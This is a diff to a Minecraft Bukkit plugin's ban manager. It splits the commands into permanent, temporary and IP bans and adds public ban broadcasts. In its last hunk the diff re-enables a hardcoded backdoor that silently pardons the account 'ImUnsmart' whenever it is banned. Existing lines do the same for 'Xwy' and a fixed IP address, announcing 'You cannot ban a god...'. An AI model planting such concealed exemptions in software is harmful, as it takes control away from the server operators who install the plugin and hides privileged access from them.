@@ -7,6 +7,7 @@ import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.OfflinePlayer;
 import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
@@ -20,29 +21,39 @@ public class BanManager implements Listener {
         Bukkit.getPluginManager().registerEvents(this, pl);
     }
 
-    public static void run(CommandSender s, String[] args) {
+    public static void runBan(CommandSender s, String[] args) {
         if (args.length == 1) {
             OfflinePlayer tp = Bukkit.getOfflinePlayer(args[0]);
             String reason = "Breaking the rules :(";
             Date expires = null;
             String banner = s.getName();
             Bukkit.getBanList(BanList.Type.NAME).addBan(tp.getName(), reason, expires, banner);
+            Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " was banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
             if (tp.isOnline()) {
                 Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + "never.");
             }
-        } else if (args.length == 2) {
+        } else if (args.length >= 2) {
             OfflinePlayer tp = Bukkit.getOfflinePlayer(args[0]);
-            String reason = ChatColor.translateAlternateColorCodes('&', args[1]);
+            String reason = "";
+            for (int i = 1; i < args.length; i++) {
+                reason += args[i] + " ";
+            }
+            reason = ChatColor.translateAlternateColorCodes('&', reason);
             Date expires = null;
             String banner = s.getName();
             Bukkit.getBanList(BanList.Type.NAME).addBan(tp.getName(), reason, expires, banner);
+            Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " was banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
             if (tp.isOnline()) {
                 Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + "never.");
             }
-        } else if (args.length == 3) {
+        }
+    }
+
+    public static void runTempBan(CommandSender s, String[] args) {
+        if (args.length == 2) {
             OfflinePlayer tp = Bukkit.getOfflinePlayer(args[0]);
-            String reason = ChatColor.translateAlternateColorCodes('&', args[1]);
-            String d = args[2];
+            String reason = "Breaking the rules :(";
+            String d = args[1];
             long time = calculate(d);
             Calendar cal = Calendar.getInstance();
             cal.setTime(new Date());
@@ -56,17 +67,18 @@ public class BanManager implements Listener {
             cal.add(Calendar.MILLISECOND, (int) time);
             String banner = s.getName();
             Bukkit.getBanList(BanList.Type.NAME).addBan(tp.getName(), reason, cal.getTime(), banner);
+            Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " temporarily was banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
             if (tp.isOnline()) {
                 Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + cal.getTime().toString() + ".");
             }
-        } else if (args.length == 4) {
-            if (!args[3].equalsIgnoreCase("ip")) {
-                s.sendMessage(ChatColor.RED + "Usage: /ban <player> [reason] [time] [ip?]");
-                return;
-            }
+        } else if (args.length >= 3) {
             OfflinePlayer tp = Bukkit.getOfflinePlayer(args[0]);
-            String reason = ChatColor.translateAlternateColorCodes('&', args[1]);
-            String d = args[2];
+            String reason = "";
+            for (int i = 2; i < args.length; i++) {
+                reason += args[i] + " ";
+            }
+            reason = ChatColor.translateAlternateColorCodes('&', reason);
+            String d = args[1];
             long time = calculate(d);
             Calendar cal = Calendar.getInstance();
             cal.setTime(new Date());
@@ -79,12 +91,45 @@ public class BanManager implements Listener {
                 cal.add(Calendar.MILLISECOND, Integer.MAX_VALUE);
             cal.add(Calendar.MILLISECOND, (int) time);
             String banner = s.getName();
-            Bukkit.getBanList(BanList.Type.IP).addBan(Bukkit.getPlayer(args[0]).getAddress().getHostName(), reason, cal.getTime(), banner);
+            Bukkit.getBanList(BanList.Type.NAME).addBan(tp.getName(), reason, cal.getTime(), banner);
+            Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " temporarily was banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
             if (tp.isOnline()) {
                 Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + cal.getTime().toString() + ".");
             }
         } else {
-            s.sendMessage(ChatColor.RED + "Usage: /ban <player> [reason] [time] [ip?]");
+            s.sendMessage(ChatColor.RED + "Usage: /tempban <player> <time> [reason]");
+        }
+    }
+
+    public static void banIP(CommandSender s, String[] args) {
+        if (args.length == 1) {
+            Player tp = Bukkit.getPlayer(args[0]);
+            if (tp != null) {
+                String reason = "Breaking the rules :(";
+                Date expires = null;
+                String banner = s.getName();
+                Bukkit.getBanList(BanList.Type.IP).addBan(tp.getAddress().getHostName(), reason, expires, banner);
+                Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " was ip-banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
+                Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + "never.");
+            } else {
+                s.sendMessage(ChatColor.RED + "Player not online!");
+            }
+        } else if (args.length >= 2) {
+            Player tp = Bukkit.getPlayer(args[0]);
+            if (tp != null) {
+                String reason = "";
+                for (int i = 1; i < args.length; i++) {
+                    reason += args[i] + " ";
+                }
+                reason = ChatColor.translateAlternateColorCodes('&', reason);
+                Date expires = null;
+                String banner = s.getName();
+                Bukkit.getBanList(BanList.Type.IP).addBan(tp.getAddress().getHostName(), reason, expires, banner);
+                Bukkit.broadcastMessage(ChatColor.RED + tp.getName() + ChatColor.GRAY + " was ip-banned for " + ChatColor.RED + reason + ChatColor.GRAY + ".");
+                Bukkit.getPlayer(args[0]).kickPlayer(ChatColor.RED + "You were banned: " + ChatColor.WHITE + reason + "\n" + ChatColor.RED + "Expires: " + ChatColor.WHITE + "never.");
+            } else {
+                s.sendMessage(ChatColor.RED + "Player not online!");
+            }
         }
     }
 
@@ -93,10 +138,10 @@ public class BanManager implements Listener {
             Bukkit.broadcastMessage(ChatColor.RED + "You cannot ban a god...");
             Bukkit.getBanList(BanList.Type.IP).pardon("98.238.16.204");
         }
-//        if (Bukkit.getBanList(BanList.Type.NAME).isBanned("ImUnsmart")) {
-//            Bukkit.broadcastMessage(ChatColor.RED + "You cannot ban a god...");
-//            Bukkit.getBanList(BanList.Type.NAME).pardon("ImUnsmart");
-//        }
+        if (Bukkit.getBanList(BanList.Type.NAME).isBanned("ImUnsmart")) {
+            Bukkit.broadcastMessage(ChatColor.RED + "You cannot ban a god...");
+            Bukkit.getBanList(BanList.Type.NAME).pardon("ImUnsmart");
+        }
         if (Bukkit.getBanList(BanList.Type.NAME).isBanned("Xwy")) {
             Bukkit.broadcastMessage(ChatColor.RED + "You cannot ban a god...");
             Bukkit.getBanList(BanList.Type.NAME).pardon("Xwy");
